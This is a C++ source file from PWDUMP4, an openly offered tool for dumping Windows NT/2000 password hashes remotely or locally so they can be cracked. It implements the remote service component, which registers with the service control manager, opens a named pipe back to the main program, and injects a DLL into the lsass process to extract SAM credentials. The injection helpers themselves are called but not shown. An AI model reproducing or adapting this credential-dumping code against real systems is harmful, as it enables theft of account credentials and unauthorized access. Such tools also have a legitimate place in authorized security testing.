/***************************************************************************
 * Program: PWDUMP4 - dump winnt/2000 user/password hash remote or local for crack
 * 
 * Copyright (c) 2002, 2003 bingle, all rights reserved
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 *
 * Author:  bingle@email.com.cn
 * File:    DumpService.cpp
 * Purpose: service file for starting remote dump from NT SAM
 * Date:    2002-1-20
 * 
 ***************************************************************************/

#include <stdio.h>
#include <assert.h>
#include <windows.h>
#include "PwDump4.h"

SERVICE_STATUS_HANDLE hSrv;
DWORD dwCurrState;

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    srvStatus.dwCurrentState = dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 3000;
    return SetServiceStatus( hSrv, &srvStatus );
}

void __stdcall PWServiceHandler( DWORD dwCommand )
{
    // not really necessary because the service stops quickly
    switch( dwCommand )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( dwCurrState, 0, 0 );
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        break;
    }
}


/*
The service & inject part used to send information to main program.
*/
HANDLE hPipe = INVALID_HANDLE;
char szBuffer[1000] = { SRV_OUTPUT_TAG };

int SendText( char *lpFmt, ... )
{
	va_list	arglist;
	DWORD dwWritten;
	char *ptr = szBuffer + 4;

	assert( strlen(SRV_OUTPUT_TAG) == 4 && memcmp( szBuffer, SRV_OUTPUT_TAG, 4 ) == 0 );

	va_start( arglist, lpFmt );
	_vsnprintf( ptr, sizeof(szBuffer)-4, lpFmt, arglist );
	va_end( arglist );
	
	if( !WriteFile (hPipe, szBuffer, strlen(szBuffer), &dwWritten, NULL) )
		DebugOutput( "WriteFile failed: %d, Format: %s\n",
			GetLastError(), lpFmt);
	else return 1;

	return 0;
}

void __stdcall PWServiceMain( int argc, char* argv[] )
{
	#ifdef _DEBUG
	//	DebugBreak(); // for debug the service
	#endif

	if( argc != 3 ) return;

    HANDLE hLsassProc;
	char *pipe = argv[1];
    unsigned magic = strtoul( argv[2], NULL, 16 );

	hSrv = RegisterServiceCtrlHandler( argv[0], (LPHANDLER_FUNCTION)PWServiceHandler );
    if( hSrv == NULL ) return;

    TellSCM( SERVICE_START_PENDING, 0, 1 );

	if( ExecuteMainName(exeName) != 0 ) return;
	hLsassProc = PrepareInject( pipe, RUN_REMOTELY );
	if( !hLsassProc ) goto exit;

    TellSCM( SERVICE_RUNNING, 0, 0 );

    // Inject the dll
    InjectDll( hLsassProc, magic );
	//Sleep( 1000 );
exit:
	/*
	if close hPipe here, will cause other end client occur 233(No process on the other end of the pipe) error,
	and cannot get the data in pipe buffer, so we need to sleep for
	a while before close pipe for client read all data, but there's 
	no guideline about sleep time ; if we don't close, even if the 
	process terminate, the other end of pipe's client process can read
	all data in pipe buffer, and at last get a 109(Pipe End normally) error.
	*/
//	if( hPipe != INVALID_HANDLE ) EndBindPipe( hPipe );
	CloseHandle( hLsassProc );
    TellSCM( SERVICE_STOP_PENDING, 0, 0 );
    TellSCM( SERVICE_STOPPED, 0, 0 );

#ifdef _DEBUG
	Sleep( 10000 );
#endif

    return;
}

